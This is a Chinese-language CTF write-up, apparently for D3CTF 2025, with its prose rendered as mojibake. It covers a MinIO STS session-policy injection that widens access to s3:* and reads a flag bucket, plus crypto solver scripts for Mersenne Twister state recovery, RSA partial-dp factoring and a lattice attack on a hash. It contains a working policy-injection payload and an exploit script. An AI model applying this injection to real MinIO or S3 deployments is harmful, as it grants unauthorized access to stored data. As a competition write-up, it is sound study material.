é¢˜ç›®å®¹å™¨æ˜¾ç¤ºæœ‰ä¸€ä¸ªminioï¼Œä¸€å¼€å§‹å…ˆæµ‹è¯•äº†minioçš„æœªæˆæƒä¿¡æ¯æ³„éœ²CVEï¼Œæ— æœï¼Œé‚ç»§ç»­æŠ“åŒ…åˆ†æï¼Œå¹¶å°†`static/js/tools.js`ä¸¢ç»™AIåˆ†æäº†ä¸€ä¸‹ï¼Œå‘ç°æ€»å…±å°±ä¸‰ä¸ªæ¥å£ï¼š`/api/genSTSCreds`ï¼Œ`/api/getObject`ï¼Œ`/api/putObject`

/api/genSTSCreds æ¥å£è·å–STSå‡­è¯

```YAML
POST /api/genSTSCreds HTTP/1.1
Host: 34.150.83.54:31668
Content-Length: 26
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://34.150.83.54:31668
Referer: http://34.150.83.54:31668/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"object_name":"test.txt"}
```

æµ‹è¯•å‘ç°è¿”å›çš„STSå‡­è¯åªèƒ½ç”¨æ¥è¯»å–å¯¹åº”åç§°çš„å¯¹è±¡ï¼Œæ˜¾ç„¶æœ‰ç­–ç•¥æ§åˆ¶åªèƒ½è®¿é—®å¯¹åº”åç§°çš„å­˜å‚¨æ¡¶å¯¹è±¡

ç”¨webæœåŠ¡æä¾›çš„è¯»å–å­˜å‚¨æ¡¶æ¥å£è¦æ³¨æ„å°†secret_access_keyè¿›è¡ŒURLç¼–ç (å¯¹`+`å·è¿›è¡ŒURLç¼–ç )

å°è¯•è¿‡çˆ†ç ´JWT SECRETï¼Œæ— æœ

ç„¶åå°†è¿”å›çš„STSå‡­è¯çš„session_tokençš„å†…å®¹æ‹¿å»jwtè§£å¯†ï¼Œå‘ç°`sessionPolicy`éƒ¨åˆ†æœ‰è¾“å…¥çš„å†…å®¹ï¼ˆobject_nameï¼‰å­˜åœ¨ï¼ŒçŒœæµ‹å¯ä»¥è¿›è¡ŒRAMç­–ç•¥æ³¨å…¥

https://forum.butian.net/share/4340

å…ˆæµ‹è¯•äº†ä¸€ä¸‹é€šè¿‡æ³¨å…¥æ¥æ‰©å±•ç­–ç•¥çš„èµ„æº(Resources)èŒƒå›´

```Plain
{"object_name":"*\",\"arn:aws:s3:::*"}
```

å‘ç°å¯ä»¥è®¿é—®å½“å‰å­˜å‚¨æ¡¶ä¸Šä¼ çš„æ‰€æœ‰æ–‡ä»¶ï¼Œç¡®å®æ˜¯å¯ä»¥æ³¨å…¥çš„

æ„é€ æ³¨å…¥å…è®¸æ‰§è¡Œæ‰€æœ‰Actionçš„ç­–ç•¥

```YAML
POST /api/genSTSCreds HTTP/1.1
Host: 127.0.0.1:11243
Content-Length: 99
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
sec-ch-ua: "Not.A/Brand";v="99", "Chromium";v="136"
Content-Type: application/json
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: */*
Origin: http://127.0.0.1:11243
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:11243/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"object_name": "*\"]},{\"Effect\":\"Allow\",\"Action\":[\"s3:*\"],\"Resource\":[\"arn:aws:s3:::*"}
```

ä¸€å¼€å§‹è¯·æ±‚çš„æ—¶å€™æŠ¥é”™`SignatureDoesNotMatch`

```XML
<?xml version="1.0" encoding="UTF-8"?>
<Error><Code>SignatureDoesNotMatch</Code><Message>The request signature we calculated does not match the signature you provided. Check your key and signing method.</Message><Resource>/</Resource><RequestId>18445CC363C4457D</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
```

åé¢å‘ç°é”™è¯¯åŸå› æ˜¯ç¼ºå°‘å®‰å…¨ä»¤ç‰Œçš„ç­¾åè®¡ç®—ï¼Œæˆ‘å°† `x-amz-security-token` åŠ å…¥äº†è¯·æ±‚å¤´ï¼Œä½†æ²¡æœ‰åŒ…å«åœ¨ç­¾åè®¡ç®—ä¸­ï¼ŒMinIOä¼šéªŒè¯æ‰€æœ‰ç­¾åå¤´éƒ¨çš„å®Œæ•´æ€§

![](../images/2025-D3CTF/image13.webp)

è®¿é—®æ ¹ç›®å½•ï¼Œå¯ä»¥çœ‹åˆ°flagå­˜å‚¨æ¡¶ï¼Œè®¿é—®é‡Œé¢çš„flagé”®å¾—åˆ°flag

![](../images/2025-D3CTF/image14.webp)

DeepSeekä¸€æŠŠæ¢­Expï¼š

```Python
import hmac
import hashlib
import datetime
import urllib.parse
import requests

#æ›´æ”¹ä¸ºè‡ªå·±é€šè¿‡/api/genSTSCredsè·å–çš„
ACCESS_KEY = "PTKZVLPN95ORZHJTBK0D"
SECRET_KEY = "d9QeMbVCgiMUE+EJ1eHfZIZlll+f6qmoL42HQTif"
SESSION_TOKEN = "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3NLZXkiOiJQVEtaVkxQTjk1T1JaSEpUQkswRCIsImV4cCI6MTc0ODYyODI3MSwicGFyZW50IjoiQjlNMzIwUVhIRDM4V1VSMk1JWTMiLCJzZXNzaW9uUG9saWN5IjoiZXlKV1pYSnphVzl1SWpvaU1qQXhNaTB4TUMweE55SXNJbE4wWVhSbGJXVnVkQ0k2VzNzaVJXWm1aV04wSWpvaVFXeHNiM2NpTENKQlkzUnBiMjRpT2xzaWN6TTZSMlYwVDJKcVpXTjBJaXdpY3pNNlVIVjBUMkpxWldOMElsMHNJbEpsYzI5MWNtTmxJanBiSW1GeWJqcGhkM002Y3pNNk9qcGtNMmx1ZG1sMFlYUnBiMjR2SWwxOUxIc2lSV1ptWldOMElqb2lRV3hzYjNjaUxDSkJZM1JwYjI0aU9sc2ljek02S2lKZExDSlNaWE52ZFhKalpTSTZXeUpoY200NllYZHpPbk16T2pvNktpSmRmVjE5In0.wgYw9JJXuiACRXaZmIh2i-GSVUSEUW1kNLkRenMPpntr4r9DasxvArw0llt1eROVuTiOFR9Z3SSI0xpDzDDlwQ"
MINIO_ENDPOINT = "http://34.150.83.54:30761"

def sign(key, msg):
    return hmac.new(key, msg.encode('utf-8'), hashlib.sha256).digest()

def get_signature_key(key, date_stamp, region_name, service_name):
    k_date = sign(('AWS4' + key).encode('utf-8'), date_stamp)
    k_region = sign(k_date, region_name)
    k_service = sign(k_region, service_name)
    return sign(k_service, 'aws4_request')

def generate_aws_headers(method, path):
    # è·å–æ—¶é—´å’Œä¸»æœºä¿¡æ¯
    now = datetime.datetime.utcnow()
    amz_date = now.strftime('%Y%m%dT%H%M%SZ')
    date_stamp = now.strftime('%Y%m%d')
    host = MINIO_ENDPOINT.split('//')[1].split('/')[0]  # æ­£ç¡®è·å–ä¸»æœº:ç«¯å£
    
    # è§„èŒƒURIç¼–ç  (å…³é”®ä¿®å¤)
    canonical_uri = '/' + '/'.join(
        urllib.parse.quote(segment, safe='') 
        for segment in path.split('/')
    )
    
    # è§„èŒƒæŸ¥è¯¢å­—ç¬¦ä¸² (æœ¬ä¾‹ä¸­ä¸ºç©º)
    canonical_querystring = ""
    
    # è§„èŒƒå¤´éƒ¨ (æŒ‰å­—æ¯é¡ºåºæ’åº)
    canonical_headers = f"host:{host}\n"
    canonical_headers += f"x-amz-date:{amz_date}\n"
    canonical_headers += f"x-amz-security-token:{SESSION_TOKEN}\n"  # åŒ…å«åœ¨ç­¾åä¸­
    
    signed_headers = "host;x-amz-date;x-amz-security-token"  # æŒ‰å­—æ¯é¡ºåº
    
    # è§„èŒƒè¯·æ±‚ä½“å“ˆå¸Œ (GETè¯·æ±‚ä¸ºç©º)
    payload_hash = hashlib.sha256(b'').hexdigest()
    
    # æ„å»ºè§„èŒƒè¯·æ±‚
    canonical_request = (
        f"{method}\n"
        f"{canonical_uri}\n"
        f"{canonical_querystring}\n"
        f"{canonical_headers}\n"
        f"{signed_headers}\n"
        f"{payload_hash}"
    )
    
    # åˆ›å»ºå¾…ç­¾åå­—ç¬¦ä¸²
    algorithm = "AWS4-HMAC-SHA256"
    credential_scope = f"{date_stamp}/us-east-1/s3/aws4_request"
    string_to_sign = (
        f"{algorithm}\n"
        f"{amz_date}\n"
        f"{credential_scope}\n"
        f"{hashlib.sha256(canonical_request.encode('utf-8')).hexdigest()}"
    )
    
    # è®¡ç®—ç­¾å
    signing_key = get_signature_key(SECRET_KEY, date_stamp, "us-east-1", "s3")
    signature = hmac.new(
        signing_key, 
        string_to_sign.encode('utf-8'), 
        hashlib.sha256
    ).hexdigest()
    
    # æ„å»ºæˆæƒå¤´
    authorization_header = (
        f"{algorithm} Credential={ACCESS_KEY}/{credential_scope}, "
        f"SignedHeaders={signed_headers}, "
        f"Signature={signature}"
    )
    
    return {
        'Host': host,
        'x-amz-date': amz_date,
        'x-amz-security-token': SESSION_TOKEN,
        'Authorization': authorization_header
    }

def list_all_buckets():
    headers = generate_aws_headers("GET", f"/")
    url = f"{MINIO_ENDPOINT}/"
    response = requests.get(url, headers=headers)

    
    if response.status_code == 200:
        print("[+] æ‰€æœ‰å­˜å‚¨æ¡¶åˆ—è¡¨:")
        print(response.text)
        return response.text
    else:
        print("[ERROR]")
        print(response.text)

# ä½¿ç”¨ç¤ºä¾‹
if __name__ == "__main__":
    headers = generate_aws_headers("GET", "flag/flag")
    # å‘é€è¯·æ±‚
    response = requests.get(
        f"{MINIO_ENDPOINT}/flag/flag",
        headers=headers
    )
    print(response.text)
```

---

# Crypto

## d3guess

```Python
import os
os.environ['TERM'] = 'xterm'

from pwn import *
from tqdm import trange

context.proxy = (socks.HTTP, '172.27.224.1', 7897)

class Gao:
    def __init__(self):
        self.conn = process(['python3', 'another.py'])
        # self.conn = remote('35.220.136.70', '30591')
        self.rng_counter = 0
        self.randoms = []
        self.positions = []
        self.dest = 624 * 32
        self.bit_counter = 0

        self.fail_counter = 0
    
    def gao_1_one(self):
        current_randoms = []
        current_positions = []
        random_position = self.rng_counter
        self.rng_counter += 1

        self.conn.recvuntil('give me a number > ')
        self.conn.sendline('0')
        k = 6 - int(float(self.conn.recvline().decode().strip()) / 0.075)
        self.rng_counter += 2
        l = 2**31 * k // 3
        r = (2**31 * (k+1) + 2) // 3
        while (r - l > 1):
            mid = (l + r) // 2
            t = mid + 2**31 - 1
            self.conn.recvuntil('give me a number > ')
            self.conn.sendline(str(t))
            feedback = self.conn.recvline().decode().strip()
            self.rng_counter += 2
            if feedback == '0.225':
                r = mid
            elif feedback == '0.3':
                l = mid
            else:
                print("Unexpected feedback:", feedback)
                raise Exception
        self.conn.recvuntil('give me a number > ')
        self.conn.sendline(str(l))
        current_randoms = [f'{l - 1:032b}'] + current_randoms
        current_positions = [random_position] + current_positions
        self.randoms.extend(current_randoms)
        self.positions.extend(current_positions)
        self.bit_counter += 32

    def gao_1(self):
        for i in trange(350):
            self.gao_1_one()

    def find_mid(self, interval_prob: list[tuple[int, int, float]]) -> int:
        def calc_weighted_sum(interval_prob: list[tuple[int, int, float]], mid: int):
            weighted_sum = 0
            for l, r, prob in interval_prob:
                if mid < l:
                    break
                elif mid > r:
                    weighted_sum += (r - l + 1) * prob
                else:
                    weighted_sum += (mid - l + 1) * prob
            return weighted_sum
        all_prob = 0
        for l, r, prob in interval_prob:
            all_prob += (r - l + 1) * prob
        half_prob = all_prob / 2
        L = 1
        R = 2**32 - 1
        while (R - L > 1):
            MID = (L + R) // 2
            # Calculate weighted sum till mid
            weighted_sum = calc_weighted_sum(interval_prob, MID)
            if weighted_sum < half_prob:
                L = MID
            else:
                R = MID

        return L

    def gao_2_one(self):
        random_position = self.rng_counter
        current_guess = []
        current_result = []
        self.rng_counter += 1
        x_l = 1
        x_r = 2**31 - 1

        def extend_randoms(is_win: bool):
            current_randoms = []
            current_positions = []

            for i in range(len(current_guess)):
                rng_counter = random_position + 2 * i + 1
                guess_i = current_guess[i]
                result_i = current_result[i]
                if (
                    ((guess_i < x_l) and (result_i == 'smaller'))
                    or ((guess_i > x_r) and (result_i == 'bigger'))
                ):
                    current_randoms.append('000' + '?' * 29)
                    current_positions.append(rng_counter)
                    self.bit_counter += 3

            HIGH_BITS = 6
            LOW_BITS = 32 - HIGH_BITS
            if is_win:
                known_number = x_l - 1
                current_randoms = [f'{known_number:032b}'] + current_randoms
                current_positions = [random_position] + current_positions
                self.bit_counter += 32
            else:
                known_number = (x_l + x_r) // 2 - 1
                known_number = known_number >> LOW_BITS
                current_randoms = [f'{known_number:0{HIGH_BITS}b}' + '?' * LOW_BITS] + current_randoms
                current_positions = [random_position] + current_positions
                self.bit_counter += HIGH_BITS
                pass
            
            self.randoms.extend(current_randoms)
            self.positions.extend(current_positions)

        cnt = 0
        interval_prob = [(1, 2**32-1, 1.)]
        while (cnt < 63):
            cnt += 1
            # get mid
            mid = self.find_mid(interval_prob)
            self.conn.recvuntil('give me a number > ')
            self.conn.sendline(str(mid))
            feedback = self.conn.recvline().decode().strip()
            if feedback == 'your number is too big':
                more_prob = 0.1
                less_prob = 0.9
                self.rng_counter += 2
                current_guess.append(mid)
                current_result.append('smaller')
            elif feedback == 'your number is too small':
                more_prob = 0.9
                less_prob = 0.1
                self.rng_counter += 2
                current_guess.append(mid)
                current_result.append('bigger')
            elif feedback == 'you win':
                x_l = mid
                x_r = mid
                extend_randoms(True)
                return
            else:
                print("Unexpected feedback:", feedback)
                raise Exception
            # Update intervals
            new_interval_prob = []
            for l, r, prob in interval_prob:
                if mid < l:
                    new_interval_prob.append((l, r, prob * more_prob))
                elif mid > r:
                    new_interval_prob.append((l, r, prob * less_prob))
                else:
                    if (l <= mid - 1):
                        new_interval_prob.append((l, mid-1, prob * less_prob))
                    if (mid + 1 <= r):
                        new_interval_prob.append((mid+1, r, prob * more_prob))
            interval_prob = new_interval_prob
        best_interval = (0, 0, 0)
        best_density = 0.0
        for l, r, prob in interval_prob:
            if prob / (r - l + 1) > best_density:
                best_density = prob / (r - l + 1)
                best_interval = (l, r, prob)
        l, r, prob = best_interval
        self.conn.recvuntil('give me a number > ')
        guess = (l + r) // 2
        self.conn.sendline(str(guess))
        feedback = self.conn.recvline().decode().strip()
        if feedback == 'you win':
            x_l = guess
            x_r = guess
            extend_randoms(True)
        else:
            x_l = guess - 2**24
            x_r = guess + 2**24
            self.fail_counter += 1
            if feedback == 'your number is too big':
                self.rng_counter += 2
                current_guess.append(mid)
                current_result.append('smaller')
            elif feedback == 'your number is too small':
                self.rng_counter += 2
                current_guess.append(mid)
                current_result.append('bigger')
            extend_randoms(False)

    def solve_mt(self):
        my_bits = []
        current_position = -1
        for i in range(len(self.randoms)):
            current_bits = '?' * 32 * (self.positions[i] - 1 - current_position)
            current_bits += self.randoms[i]
            current_position = self.positions[i]
            my_bits.append(current_bits)
        my_bits = ''.join(my_bits)
        # Call MT solver
        io = process(['sage', 'maple_server.py'])
        io.sendlineafter('> ', my_bits)
        io.recvuntil('AOLIGEI: ')
        state = eval(io.recvline())
        r = random.Random()
        r.setstate(state)
        for i in range(self.rng_counter):
            r.getrandbits(32)
        io.close()
        return r

    def gao_2(self):
        part_1_counter = 0
        for i in trange(2200):
            self.gao_2_one()
            part_1_counter += 1
            if self.fail_counter == 87:
                break
        # Try to recover MT
        print(f'{self.bit_counter = }')
        print(f'dest = {624 * 32 = }')
        # to question mask
        r = self.solve_mt()
        for i in trange(2200 - part_1_counter):
            self.conn.recvuntil('give me a number > ')
            self.conn.sendline(str(r.randint(1, 2**32 - 1)))
            feedback = self.conn.recvline().decode().strip()
            if feedback != 'you win':
                raise Exception("GG")

    def gao(self):
        self.gao_1()
        self.gao_2()
        self.conn.interactive()

if __name__ == '__main__':
    g = Gao()
    g.gao()
```

```Python
import random
from contextlib import contextmanager
from time import perf_counter

from gf2bv import LinearSystem
from gf2bv.crypto.mt import MT19937

@contextmanager
def timeit(task_name):
    start = perf_counter()
    try:
        yield
    finally:
        end = perf_counter()
        print(f"{task_name} took {end - start:.2f} seconds")

def mt19937_server():
    LENGTH = 624 * 32

    my_bits = input('> ')
    bits_cnt = 0
    for i in range(len(my_bits)):
        if my_bits[i] != '?':
            bits_cnt += 1
        if bits_cnt == LENGTH:
            known_bits = my_bits[:i+1]
            known_bits = known_bits + '?' * (-len(known_bits) % 32)
            break
    else:
        raise ValueError(f'Not enough known bits provided. Need at least {LENGTH} bits.')

    temp = []
    bits = []
    for i in range(0, len(known_bits), 32):
        segment = known_bits[i:i+32]
        # nn = prng.getrandbits(32)
        # Assume ? is behind the known bits
        segment = segment.replace('?', '')
        bits.append(len(segment))
        temp.append(int(segment, 2) if segment else 0)

    out = temp
    lin = LinearSystem([32] * 624)
    mt = lin.gens()

    rng = MT19937(mt)
    with timeit("generate system"):
        zeros = []
        for b, t in zip(bits, out):
            if b == 0:
                rng.getrandbits(32)
            else:
                zeros.append(rng.getrandbits(b) ^ t)
        zeros.append(mt[0] ^ 0x80000000)
    print("solving...")
    with timeit("solve_one"):
        sol = lin.solve_one(zeros)
    print("solved", sol[:10])

    rng = MT19937(sol)
    pyrand = rng.to_python_random()
    print(f'AOLIGEI: {pyrand.getstate()}')

if __name__ == "__main__":
    mt19937_server()
```

---

## d3sysv2

å¯èƒ½èƒ½å‚è€ƒçš„è®ºæ–‡ï¼šhttps://eprint.iacr.org/2022/1163.pdf

ä¸è¿‡å‰å¹´æ³„éœ²çš„æ˜¯LSBï¼Œè¿™æ¬¡æ³„éœ²çš„æ˜¯MSBï¼Œæ„Ÿè§‰å°±å¯¹ç€è®ºæ–‡å¤ç°ä¸€ä¸‹

ä½†æ˜¯step 1 æ±‚å‡ºæ¥çš„æ˜¯ k', l' mod eï¼Œè®°ä¸ºke, leï¼Œè¿˜ä¸æ˜¯k', l'ï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯æ±‚å‡º k', l'

å·²çŸ¥æ¡ä»¶ k'l' = c, k' = ke + rp* e, l' = le + rq * e ï¼Œå…¶ä¸­ rp, rq æœªçŸ¥ä¸”ä¸º153 bitï¼Œke, le, e, c åˆ™æ˜¯å·²çŸ¥çš„ã€‚å¦‚ä½•æ±‚å‡ºrp, rq?

è¿™å°±æ˜¯å·²çŸ¥pä½ä½åˆ†è§£emmmmm

æ±‚è§£å®Œä¹‹åstep2 åŒæ ·æ˜¯ä¸ªå·²çŸ¥éƒ¨åˆ†påˆ†è§£ï¼Œç”¨small_root æ±‚è§£çš„è¯éœ€è¦ä»”ç»†è°ƒè°ƒå‚ï¼Œä¸ç„¶5ç§’çš„é™åˆ¶æ˜¯è¿‡ä¸å»çš„ã€‚

```Python
from Crypto.Util.number import long_to_bytes,bytes_to_long, getPrime, inverse
from hashlib import sha256
from pwn import remote
import time

nbit = 3072
blind_bit = 153
unknownbit = 983
e_bit = 170


alpha = 170. / 3072.
gamma = 153. / 3072.
delta = 983. / 3072.

print('MSB case')
assert nbit//2-2*e_bit - blind_bit > unknownbit
print('Bound check pass')

while True:
    # conn = remote('127.0.0.1', int(10001))
    conn = remote('35.220.136.70', int(31539))

    conn.recvuntil(b'option >')

    bgt = time.time()
    conn.sendline(b'G')
    conn.recvuntil(b'dp,dq:')
    dp_M, dq_M = eval(conn.recvline())
    conn.recvuntil(b'n,e:')
    n,e = eval(conn.recvline())[0]

    # step 1
    N = n
    A_ = 2**(2*unknownbit)*e**2*dp_M*dq_M // N
    # assert A_+1 == real_k_*real_l_

    k_pl_ = (1 - (A_+1)*(N-1)) % e
    # assert (real_k_ + real_l_)%e == k_pl_

    P.<x> = PolynomialRing(Zmod(e))
    f = x*(k_pl_-x) - (A_+1)
    k_ = int(f.roots()[0][0])
    l_ = int(f.roots()[1][0])

    # assert k_ == real_k_ % e or k_ == real_l_ % e
    # assert l_ == real_k_ % e or l_ == real_l_ % e


    P.<x> = PolynomialRing(Zmod(A_+1))
    f = e * x + k_
    f = f.monic()
    tmp = f.small_roots(X=2**blind_bit, beta=0.43, epsilon=0.02)
    if len(tmp) ==0:
        continue
    k_h = tmp[0]
    rec_k = int(k_h * e + k_)

    print(time.time()-bgt)

    # step 2

    a = (e*dp_M*2**unknownbit + rec_k -1) * inverse_mod(e, rec_k*N)

    PR.<xx> = PolynomialRing(Zmod(rec_k * N))

    f_MSB = xx + a

    tmp = f_MSB.small_roots(X=2 ** unknownbit, beta=0.46, epsilon=0.0165)
    print(time.time() - bgt)
    if len(tmp) ==0 or time.time() - bgt > 5:
        continue

    rec_dp = dp_M*2**unknownbit + tmp[0]
    rec_dp = int(rec_dp)

    rec_p = (e*rec_dp-1)//rec_k+1
    assert N % rec_p == 0
    rec_q = N // rec_p
    d = inverse_mod(e, (rec_p-1)*(rec_q-1))

    conn.recvuntil(b'option >')
    conn.sendline(b'F')
    conn.recvuntil(b'Encrypted Token: ')
    c = int(conn.recvline()[:-1].decode(), 16)
    token = power_mod(c, d, N)
    tokenhash = sha256(long_to_bytes(token)).hexdigest()
    conn.sendline(tokenhash.encode())

    print(time.time()-bgt)
    print(conn.recvline())
    print(conn.recvline())
    conn.close()
    break
```

---

## d3fnv

é¢˜ç›®ç»™å‡ºæœ€å¤š65ç»„

$$r_i = \sum_{j=0}^{n} x_{i,j} k^j \mod p$$

å…¶ä¸­på’Œ r_i å·²çŸ¥ï¼Œ x_i æ˜¯å°çš„ï¼Œkå’Œpçš„æ¯”ç‰¹æ•°ç›¸åŒï¼Œ x_i, kæœªçŸ¥ã€‚ç„¶åx_0 æ˜¯ [0, 2^14] ä»¥å†…çš„ï¼Œ å…¶ä½™éƒ½æ˜¯ [-127,127] ä»¥å†…çš„ã€‚

**å‚ç›´æ ¼çš„å±€é™æ€§**ï¼šç”±äº x_i å¹¶ä¸æ˜¯å‡åŒ€çš„ï¼Œx_0æœ‰ç‚¹å¤§ï¼Œå¯¼è‡´å‚ç›´æ ¼å‡ºæ¥çš„å‘é‡æ˜¯ä¸æ­£ç¡®çš„ï¼Œå­˜åœ¨è¯¯å·®ã€‚

ç„¶åä¹±æäº†ä¸€ä¸‹ï¼Œåœ¨ç¬¬äºŒä¸ªå‚ç›´æ ¼é‚£ä¸ªåœ°æ–¹å¢åŠ äº†ä¸€ä¸ªç³»æ•°ï¼Œç„¶åå°±å‘ç°å¯ä»¥æ¢å¤å‡ºæ­£ç¡®çš„x_iã€‚è™½ç„¶æœ‰å°‘æ•°çš„x_i æ˜¯é”™è¯¯çš„çš„ï¼Œæ˜¯è¢«å¤åˆè¿‡çš„ï¼Œä½†æ˜¯ä»ç„¶æ˜¯èƒ½æ¢å¤å‡ºå¤§éƒ¨åˆ†çš„k^jï¼Œç„¶åæ‰¾å‡ºé‚£ä¸ªç”Ÿæˆå…ƒå°±è¡Œï¼ˆç”±äºå¯èƒ½ç”Ÿæˆå…ƒè¢«è¦†ç›–ï¼Œå› æ­¤å¤šè·‘å‡ æ¬¡å°±èƒ½å‡ºç»“æœï¼‰

```Python
def find_ortho_fp(*vecs):
    assert len(set(len(v) for v in vecs)) == 1
    L = block_matrix(ZZ, [[matrix(vecs).T, matrix.identity(len(vecs[0]))], [ZZ(p), 0]])
    print("LLL", L.dimensions())
    nv = len(vecs)
    L[:, :nv] *= p
    L = L.LLL()
    ret = []
    for row in L:
        if row[:nv] == 0:
            ret.append(row[nv:])
    return matrix(ret)

def my_find_ortho_zz(*vecs):
    assert len(set(len(v) for v in vecs)) == 1
    L = block_matrix(ZZ, [[matrix(vecs).T, 128 * matrix.identity(len(vecs[0]))]])
    print("LLL", L.dimensions())
    nv = len(vecs)
    L[0,nv] = 1
    L[:, :nv] *= p
    L = L.LLL()
    ret = []
    for row in L:
        if row[:nv] == 0:
            ret.append(row[nv:])
    return matrix(ret)


def get_xs(value, x, key):
    res = []
    k_1 = inverse_mod(key, p)
    for c in value[::-1]:
        newx = x ^^ ord(c)
        res.append(x - newx)
        x = newx * k_1 % p
    res.append(x)
    return res


def H4sh(value, key):
    length = len(value)
    x = int(ord(value[0]) << 7) % p
    for c in value:
        x = ((key * x) % p) ^^ ord(c)
    x ^^= length
    return x

from pwn import remote

while True:
    # conn = remote('127.0.0.1', int(10007))
    conn = remote('35.241.98.126', int(30222))
    conn.recvuntil(b'option >')
    conn.sendline(b'G')
    p = int(conn.recvline()[4:-1])
    # key = int(conn.recvline()[4:-1])
    F = GF(p)
    N = 64

    m = N
    n = 32

    ts = []
    rds = []
    for i in range(N):
        conn.recvuntil(b'option >')
        conn.sendline(b'H')
        conn.recvuntil(b'Token Hash: ')
        random_token_hash = int(conn.recvline()) ^^ 32
        ts.append(random_token_hash)
        # rds.append(conn.recvline()[:-1].decode())
    # conn.close()

    # xs = []
    # tmp = [pow(int(key), int(_), int(p)) for _ in range(n+1)]
    # for i in range(N):
    #     xs.append(get_xs(rds[i], ts[i], key))
    #     assert vector(F, xs[i])*vector(F, tmp) == ts[i]
    # X = Matrix(ZZ, xs)

    Mhe = find_ortho_fp(ts)
    MOrtho = Mhe[: m - n-1]
    # assert Matrix(ZZ,MOrtho)*Matrix(ZZ, xs) == zero_matrix(m-n-1, len(xs[0]))
    Lxx = my_find_ortho_zz(*MOrtho).T

    def is_X(line):
        for i in range(n+1):
            tmp = [abs(_) for _ in X.T[i]]
            if all(abs(_) in tmp for _ in line):
                 print(i, 'bingo')
                 return True
        return False

    rec_Lx = []
    for i in range(33):
        ttt = [Lxx.T[i][0]]+ [_ >>7 for _ in Lxx.T[i][1:]]
        # if is_X(ttt):
        #     cnt += 1
        rec_Lx.append(ttt)

    reck = None
    rec_ks = Matrix(F, rec_Lx).solve_left(vector(F,ts))
    for idx, ele in enumerate(rec_ks):
        if ele == 1:
            continue
        cnt = 0
        for i in range(33):
            if power_mod(ele, i, p) in rec_ks:
                cnt += 1
        print(idx, cnt)
        if cnt > 15:
            reck = p - ele if cnt ==17 else ele
            print('find key', reck)
            break
    if reck is None:
        continue

    conn.recvuntil(b'option >')
    conn.sendline(b'F')
    conn.recvuntil(b'Here is a random token x: ')
    random_token = conn.recvline()[:-1].decode()
    token_hash = H4sh(random_token, int(reck))

    conn.sendline(str(token_hash).encode())
    conn.recvuntil(b'Could you tell the value of H4sh(x)? ')
    msg = conn.recvline()
    print(msg)
    if b'again' in msg:
        reck = p - reck
        conn.recvuntil(b'option >')
        conn.sendline(b'F')
        conn.recvuntil(b'Here is a random token x: ')
        random_token = conn.recvline()[:-1].decode()
        token_hash = H4sh(random_token, int(reck))

        conn.sendline(str(token_hash).encode())
    conn.interactive()

    break
```
